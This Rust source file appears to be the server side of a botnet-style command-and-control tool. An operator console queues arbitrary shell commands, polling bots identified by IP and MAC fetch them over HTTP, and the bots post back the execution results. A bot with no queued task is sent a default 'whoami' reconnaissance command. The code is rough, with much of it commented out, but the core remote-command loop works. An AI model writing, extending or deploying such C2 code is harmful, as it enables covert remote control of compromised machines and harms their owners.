use actix_protobuf::*;
use actix_web::web::{Bytes, Data, Path};
use actix_web::{web, App, Error, HttpResponse, HttpServer, Result};
use async_std::sync::Mutex;
use c2::{ExecuteReq, TaskResult};
use futures::channel::mpsc; // 1
use futures::join;
use futures::sink::SinkExt;
use futures::FutureExt;
use futures::StreamExt;
use rustyline::{error::ReadlineError, Editor};
use std::collections::VecDeque;
use std::sync::Arc;
use std::thread;
use std::{
    collections::{BTreeMap, HashMap},
    ops::Index,
    pin::Pin,
    task::Poll,
};
mod utils;
use utils::*;
mod c2;
type Sender<T> = mpsc::UnboundedSender<T>;
type Receiver<T> = mpsc::UnboundedReceiver<T>;
async fn handle_task_result(task_result: ProtoBuf<c2::TaskResult>) -> Result<HttpResponse, Error> {
    let data = task_result.data.clone();
    let _ = match data {
        Some(c2::task_result::Data::Info(info_res)) => {
            println!("got info res: {:?}", info_res);
        }
        Some(c2::task_result::Data::Execute(execute_res)) => {
            println!("got execute res: {:?}", execute_res);
        }
        _ => {
            unimplemented!();
        }
    };
    HttpResponse::Ok().protobuf(c2::Empty::default())
}

// pub type BotId
#[derive(Debug, Default, Clone)]
pub struct Event {
    msg: String,
    task_map: HashMap<String, VecDeque<c2::Task>>,
}

// impl<'a> Default for Event<'a> {
//     fn default(msg:) -> Self {

//     }
// }
// #[derive(Debug, Default)]
// pub struct Task {
//     task_type: TaskType,

// }
async fn handle_poll(
    bot_id: ProtoBuf<c2::BotId>,
    broker: Data<Arc<Mutex<Event>>>,
    // broker: Data<Event>,
) -> Result<HttpResponse, Error> {
    println!("got handle poll");
    let mut res_task: Option<c2::Task> = None;

    // let broker = broker.clone();
    // let mut event = broker.lock().await;
    // match broker.try_lock() {
    //     Some(event) _+
    // } ;
    if let Some(mut event) = broker.try_lock() {
        let task_map = &mut event.task_map;
        let task_deque = task_map.get_mut("client0").unwrap();
        let task = (task_deque).pop_front();
        match task {
            Some(tk) => {
                res_task = Some(tk);
            }
            None => {
                println!("== no task for poll");
            }
        };
    } else {
        println!("broker lock failed");
    }
    // let event =  broker.try_next();
    // let event =
    // match event {
    //     Ok(Some(ev)) => {
    //         let mut task_map = ev.clone().task_map;
    //         let task_deque = task_map.get_mut("client0").unwrap();
    //         let task = (*task_deque).pop_front();
    //         match task {
    //             Some(tk) => {
    //                 res_task = Some(tk);
    //             },
    //             None => {
    //                 println!("== no task for poll");
    //             }
    //         }
    //     },
    //     _ => {
    //         println!("no event for poll");
    //     }
    // };

    // let mut res_task: Option<c2::Task> = None;

    let id = utils::gen_uuid(&bot_id.ip, &bot_id.mac);
    println!("got poll from id:{:?}", id);

    if res_task.is_none() {
        let mut res = c2::Task::default();
        let data = c2::task::Data::Execute(ExecuteReq {
            cmd: "whoami".to_string(),
        });
        res.data = Some(data);

        res_task = Some(res);
    }

    HttpResponse::Ok().protobuf(res_task.unwrap()) // <- send response
}
#[derive(Debug, Default, Clone)]
pub struct God {
    task_map: HashMap<String, VecDeque<c2::Task>>,
}

// async fn handle_poll(broker: Data<Arc<Mutex<Receiver<Event>>>>) -> Result<HttpResponse, Error> {

async fn handle_cli(mut broker: Arc<Mutex<Event>>) -> Result<(), Error> {
    let mut rl = Editor::<()>::new();
    if rl.load_history("history.txt").is_err() {
        println!("No previous history.");
    }
    // let mut event = Event::default();
    // let tasks: VecDeque<c2::Task> = VecDeque::new();
    // self.task_map.insert("client0".to_string(), tasks);
    // let mut event = broker.lock().await;
    loop {
        let readline = rl.readline(">> ");
        match readline {
            Ok(line) => {
                if line.is_empty() {
                    continue;
                }

                // let event1 = event.clone();
                let mut event = broker.lock().await;
                let mut task_map = &mut event.task_map;
                // let task_deque = task_map.get_mut("client0").unwrap();
                let task = c2::Task {
                    data: Some(c2::task::Data::Execute(ExecuteReq { cmd: line.clone() })),
                };
                if let Some(td) = task_map.get_mut("client0") {
                    (*td).push_back(task);
                }

                // broker.send(event.clone()).await.unwrap();
                rl.add_history_entry(line.as_str());
                println!("Line: {}", line);
            }
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C");
                break;
            }
            Err(ReadlineError::Eof) => {
                println!("CTRL-D");
                break;
            }
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }
    rl.save_history("history.txt").unwrap();
    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    // let mut bots_jobs: BTreeMap<&str, VecDeque<u32>> = BTreeMap::new();
    // let jobs: VecDeque<u32> = VecDeque::new();
    // bots_jobs.insert("bot1", jobs);

    // match bots_jobs.get_mut("bot1") {
    //     Some(jobs) => {
    //         jobs.push_back(123);
    //     }
    //     None => {
    //         println!("bot1 not exist");
    //     }
    // }
    // match bots_jobs.get_mut("bot2") {
    //     Some(jobs) => {
    //         jobs.push_back(123);
    //     }
    //     None => {
    //         println!("bot2 not exist");
    //     }
    // }
    // jobs.push_back(1);
    // jobs.push_back(1);
    // jobs.push_back(2);
    // jobs.push_back(3);

    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    std::env::set_var("RUST_LOG", "actix_web=debug,actix_server=info");
    env_logger::init();
    // let (broker_sender, broker_receiver) = mpsc::unbounded();

    // let mut god = God::default();

    let mut event = Event::default();
    let tasks: VecDeque<c2::Task> = VecDeque::new();
    event.task_map.insert("client0".to_string(), tasks);
    let app_data = Arc::new(Mutex::new(event));

    let cli_future = handle_cli(app_data.clone());

    let server_future = HttpServer::new(move || {
        App::new()
            .data(app_data.clone())
            .service(web::resource("/poll").route(web::post().to(handle_poll)))
            .service(web::resource("/push_task_result").route(web::post().to(handle_task_result)))
    })
    .bind("127.0.0.1:8080")?
    .run();
    join!(cli_future, server_future);

    Ok(())
}
